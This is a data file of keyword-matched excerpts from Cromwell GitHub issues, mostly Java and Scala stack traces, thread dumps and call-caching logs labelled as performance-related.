Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-3"" #57 prio=5 os_prio=31 tid=0x00007fb76e95e000 nid=0x9b03 waiting on condition [0x00000001322d6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-17"" #56 daemon prio=5 os_prio=31 tid=0x00007fb76b6b6000 nid=0x9903 waiting on condition [0x0000000131db9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.Thr",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:20291,concurren,concurrent,20291,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-4"" #60 prio=5 os_prio=31 tid=0x00007fb76d42b000 nid=0xa103 waiting on condition [0x0000000132168000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-19"" #59 daemon prio=5 os_prio=31 tid=0x00007fb770631000 nid=0x9f03 waiting on condition [0x00000001324dc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.Thr",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:17261,concurren,concurrent,17261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-20"" #61 daemon prio=5 os_prio=31 tid=0x00007fb76b1f9000 nid=0xa303 waiting on condition [0x00000001325df000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.Thr",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:15307,concurren,concurrent,15307,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-20"" #61 dae",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:14429,concurren,concurrent,14429,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:13551,concurren,concurrent,13551,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:12673,concurren,concurrent,12673,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-9"" #69 prio=5 os_prio=31 tid=0x00007fb76f36d800 nid=0xb303 waiting on condition [0x000000012c1b6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:11795,concurren,concurrent,11795,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); [2018-11-17 09:37:14,33] [error] Error summarizing metadata; java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 3785ms.; 	at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:548); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:186); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:145); 	at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:83); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:14); 	at slick.jdbc.JdbcBackend$BaseSession.<init>(JdbcBackend.scala:453); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:46); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:37); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession(BasicBackend.scala:249); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession$(BasicBackend.scala:248); 	at slick.jdbc.JdbcBackend$DatabaseDef.acquireSession(JdbcBackend.scala:37); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:274); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); [2018-11-17 09:37:53,75] [warn] [0 (WaitingForResponseEntitySubscription)] Response entity was not subscribed after 1 second. Make sure to read the response entity body or call discardBytes() on it. GET /token Empty -> 200 OK Chunked; [2018-11-17 10:11:19,05] [warn] [0 (WaitingForResponseEntitySubscription)] Response entity was not subscribed after 1 second. Make sure to read the response entity body or call discardBytes() on it. GET /token Empty -> 200 OK Chunked; [Guo-1|12:27:21]; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4403:3018,concurren,concurrent,3018,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4403,2,['concurren'],['concurrent']
Performance,"y d; }. command <<<; set -euo pipefail; ls ""~{d}""; >>>. output {; String s = read_string(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```. On a first `141477ef-e8e6-4fb9-ae58-5c2e8a646088` run, callCaching for `task2` is negative, as it should, with this error:; ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [; {; ""message"": ""gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir"",; ""causedBy"": []; }; ],; ""message"": ""[Attempted 1 time(s)] - FileNotFoundException: gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. Now though, the directory has been created as a result of the WDL succeeding:; ```; $ gsutil ls gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir; gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir/file; ```. On a second `2690f8a5-4cd4-45e2-a93a-55125a1107f8` run, callCaching for `task2` is negative again though, with this error:; ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [; {; ""message"": ""gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir"",; ""causedBy"": []; }; ],; ""message"": ""[Attempted 1 time(s)] - FileNotFoundException: gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```; However, the directory `gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir` does exist from the previous run, so I am puzzled by the `FileNotFoundException` exception. Is it the case that directories cannot get cached by Crowmell and therefore callCaching does not work for tasks that have `Directory` as inputs?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6509:2058,Cache,Cache,2058,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509,2,"['Cache', 'cache']","['Cache', 'cached']"
Performance,"y helpful. Any ideas? . ```; cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageException: 410 Gone; {; ""error"": {; ""errors"": [; {; ""domain"": ""global"",; ""reason"": ""backendError"",; ""message"": ""Backend Error""; }; ],; ""code"": 503,; ""message"": ""Backend Error""; }; }. at cromwell.core.CromwellFatalException$.apply(core.scala:17); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:36); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```. Metadata (``api/workflows/v2/c43e7d14-36a1-4b0b-95bf-cc381db48b5b/metadata?expandSubWorkflows=false``):. (attached); [cromwell_jes_error_April272017.txt](https://github.com/broadinstitute/cromwell/files/962915/cromwell_jes_error_April272017.txt)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2215:1431,concurren,concurrent,1431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2215,5,['concurren'],['concurrent']
Performance,y(JesInitializationActor.scala:58); at scala.Option.foreach(Option.scala:257); at cromwell.backend.impl.jes.JesInitializationActor.cromwell$backend$impl$jes$JesInitializationActor$$\; writeAuthenticationFile(JesInitializationActor.scala:58); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.\; scala:52); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.\; scala:51); at scala.util.Try$.apply(Try.scala:192); at cromwell.backend.impl.jes.JesInitializationActor.beforeAll(JesInitializationActor.scala:51); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(\; BackendWorkflowInitializationActor.scala:156); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(\; BackendWorkflowInitializationActor.scala:155); at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253); at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91\; ); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scal,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2009:1426,concurren,concurrent,1426,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2009,1,['concurren'],['concurrent']
Performance,"y; [2022-12-15 21:22:59,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.reported_sex:-1:1-20000000001 [9e4f5894main.reported_sex:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,12] [info] BT-322 9e4f5894:main.reported_sex:-1:1 cache hit copying success with aggregated hashes: initial = 91C81CABBB083C238800E3CF59AF537D, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,12] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.reported_sex:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,16] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.sex_aneuploidy:-1:1-20000000003 [9e4f5894main.sex_aneuploidy:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,17] [info] BT-322 9e4f5894:main.sex_aneuploidy:-1:1 cache hit copying success with aggregated hashes: initial = 86896541F0DCB2C2B959EEF37F266B30, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,17] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.sex_aneuploidy:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,32] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.month_of_birth:-1:1-20000000024 [9e4f5894main.month_of_birth:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,32] [info] BT-322 9e4f5894:main.month_of_birth:-1:1 cache hit copying success with aggregated hashes: initial = 601F8C709AA96517AA171B340CCA88BF, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,32] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.month_of_birth:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:22877,cache,cache,22877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"yncJobExecutionActor [a3d3e011test.cwl:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-08-14 16:14:14,45] [info] BackgroundConfigAsyncJobExecutionActor [a3d3e011test.cwl:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-08-14 16:14:15,67] [error] WorkflowManagerActor Workflow a3d3e011-3a0c-4203-9edb-3d65564a1d1d failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'test.cwl.not_found': No coercion defined from wom value(s) '[]' of type 'Array[Nothing]' to 'class wom.types.WomMaybePopulatedFileType$?'.; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:839); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at 